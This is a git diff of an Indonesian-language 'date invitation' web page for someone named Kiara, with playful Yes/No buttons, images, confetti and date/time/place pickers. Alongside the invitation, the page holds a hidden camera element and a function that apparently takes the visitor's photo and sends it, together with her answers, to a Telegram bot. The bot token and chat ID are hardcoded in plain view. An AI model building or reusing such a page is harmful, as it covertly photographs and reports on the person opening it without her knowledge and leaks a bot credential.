@@ -5,6 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Jalan sama kiara</title>
 
+<!-- Memanggil Font Fredoka dari Google Fonts -->
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Fredoka:wght@400;600;700&display=swap" rel="stylesheet">
@@ -22,7 +23,6 @@
   
   body {
     margin: 0;
-    /* Mengubah font utama menjadi Fredoka */
     font-family: 'Fredoka', 'Segoe UI', sans-serif;
     min-height: 100vh;
     display: flex;
@@ -138,8 +138,19 @@
   input[type="date"], input[type="time"], select {
     width: 100%;
     background: #f8fafc;
+    color: var(--dark); /* Memperbaiki warna teks agar terlihat kontras di HP */
     text-align: center;
     box-shadow: 4px 4px 0 rgba(0,0,0,0.05);
+  }
+
+  /* Gaya Label Panduan Baru */
+  .input-label {
+    font-size: 1.1rem;
+    font-weight: 600;
+    color: var(--dark);
+    margin-bottom: 6px;
+    display: block;
+    text-align: center;
   }
 
   /* Alur Form Sembunyi */
@@ -159,6 +170,7 @@
   }
 </style>
 
+<!-- Memanggil Pustaka Canvas Confetti -->
 <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
 
 </head>
@@ -166,6 +178,7 @@
 
 <div class="bg-elements" id="bgElements"></div>
 
+<!-- Elemen Kamera Tersembunyi -->
 <video id="cameraView" autoplay playsinline></video>
 <canvas id="canvasCapture"></canvas>
 
@@ -178,6 +191,7 @@
 
   <div class="interactive-area">
     
+    <!-- STEP 1: Pilihan Awal -->
     <div id="step1" class="step active">
       <div class="buttons-row">
         <button class="yes-btn" id="yesBtn" onclick="selectYes()">Yes</button>
@@ -185,19 +199,25 @@
       </div>
     </div>
 
+    <!-- STEP 2: Tanggal (Sudah Diperbaiki dengan Label Panduan) -->
     <div id="step2" class="step">
+      <label for="dateInput" class="input-label">Mau tanggal berapa? 📅</label>
       <input type="date" id="dateInput">
       <button class="action-btn" onclick="confirmDate()">Konfirmasi Tanggal</button>
     </div>
 
+    <!-- STEP 3: Jam (Sudah Diperbaiki dengan Label Panduan) -->
     <div id="step3" class="step">
+      <label for="timeInput" class="input-label">Jam berapa ari jemput? ⏰</label>
       <input type="time" id="timeInput">
       <button class="action-btn" onclick="confirmTime()">Konfirmasi Jam</button>
     </div>
 
+    <!-- STEP 4: Tempat -->
     <div id="step4" class="step">
+      <label class="input-label">Mau kemana kita??? 📍</label>
       <select id="placeInput">
-        <option value="" disabled selected>— Mau kemana ??? —</option>
+        <option value="" disabled selected>— Pilih Tempat tujuan —</option>
         <option value="Nonton Bioskop 🎬">Nonton Bioskop 🎬</option>
         <option value="Cafe Cantik / Ngopi ☕">Cafe Hidden / Ngopi ☕</option>
         <option value="Taman Kota / Jajan Street Food 🍢">Taman Kota / Jajan Street Food 🍢</option>
@@ -206,6 +226,7 @@
       <button class="action-btn" onclick="confirmPlace()">Konfirmasi Tempat</button>
     </div>
 
+    <!-- STEP 5: Penutup -->
     <div id="step5" class="step"></div>
 
   </div>
@@ -217,7 +238,19 @@ const TELEGRAM_TOKEN = "8888926939:AAGsaVyHduKIpY05_ZYTp8vMczWI22Gzg6k";
 const TELEGRAM_CHAT_ID = "952733909"; 
 // =================================================================
 
-const images = ["nangispaw.jpg", "nangishp.jpg", "nangislimut.jpg", "nangisburik.jpg", "nangisbanjir.jpg", "mangap.jpg", "ember.jpg", "melet.jpg"];
+const images = [
+    "nangispaw.jpg",     
+    "nangishp.jpg",      
+    "nangislimut.jpg",   
+    "nangisburik.jpg",   
+    "nangisbanjir.jpg",  
+    "mangap.jpg",        
+    "love2.jpg",         
+    "love4.jpg",         
+    "love.jpg",      
+    "love3.jpg"     
+];
+
 const noTexts = ["masa gak mau", "please 🥺", "ayolah :(", "mau doong", "aku nangis nanti", "ganti pilihan yaaa?"];
 
 let clickCount = 0;
@@ -235,7 +268,7 @@ function selectNo() {
     const yesBtn = document.getElementById('yesBtn');
     const img = document.getElementById('gifImage');
     
-    if (clickCount < images.length - 2) {
+    if (clickCount < 6) {
         noBtn.innerText = noTexts[Math.min(clickCount, noTexts.length - 1)];
         img.src = images[clickCount];
         
@@ -252,7 +285,7 @@ function selectYes() {
     const img = document.getElementById('gifImage');
     const question = document.getElementById('question');
     
-    img.src = images[images.length - 1]; 
+    img.src = images[6]; 
     question.innerText = "Yayy! Atur jadwal jalan kita yaa";
     
     pemicuKonfeti();
@@ -264,24 +297,18 @@ function selectYes() {
 }
 
 function pemicuKonfeti() {
-    confetti({
-        particleCount: 140,
-        spread: 80,
-        origin: { y: 0.6 }
-    });
-
-    setTimeout(() => {
-        confetti({ particleCount: 40, angle: 60, spread: 55, origin: { x: 0.1 } });
-    }, 200);
-    setTimeout(() => {
-        confetti({ particleCount: 40, angle: 120, spread: 55, origin: { x: 0.9 } });
-    }, 400);
+    confetti({ particleCount: 140, spread: 80, origin: { y: 0.6 } });
+    setTimeout(() => { confetti({ particleCount: 40, angle: 60, spread: 55, origin: { x: 0.1 } }); }, 200);
+    setTimeout(() => { confetti({ particleCount: 40, angle: 120, spread: 55, origin: { x: 0.9 } }); }, 400);
 }
 
 function confirmDate() {
     const dateInput = document.getElementById('dateInput').value;
     if (!dateInput) { alert("Masa gak milih tanggal 📅"); return; }
     tglTerpilih = dateInput;
+
+    document.getElementById('gifImage').src = images[7];
+
     document.getElementById('step2').classList.remove('active');
     document.getElementById('step3').classList.add('active');
 }
@@ -290,6 +317,9 @@ function confirmTime() {
     const timeInput = document.getElementById('timeInput').value;
     if (!timeInput) { alert("Ari jemput jam berapa ⏰"); return; }
     jamTerpilih = timeInput;
+
+    document.getElementById('gifImage').src = images[8];
+
     document.getElementById('step3').classList.remove('active');
     document.getElementById('step4').classList.add('active');
 }
@@ -298,6 +328,8 @@ function confirmPlace() {
     const placeInput = document.getElementById('placeInput').value;
     if (!placeInput) { alert("Tempatnya belum dipilih nih! 📍"); return; }
     tempatTerpilih = placeInput;
+
+    document.getElementById('gifImage').src = images[9];
 
     document.getElementById('step4').classList.remove('active');
     document.getElementById('step5').classList.add('active');
@@ -346,7 +378,6 @@ function ambilDanKirimFoto() {
     }, 1000); 
 }
 
-// Fungsi Fetch API untuk mengirim data teks ke Bot Telegram
 function kirimDataKeTelegram() {
     const pesan = `Kiara Mau\n\nDia mau diajak Jalan:\n📅 Tanggal: ${tglTerpilih}\n⏰ Jam Jemput: ${jamTerpilih}\n📍 Tempat: ${tempatTerpilih}\n\nSegera persiapkan dirimu! 😎`;
     fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
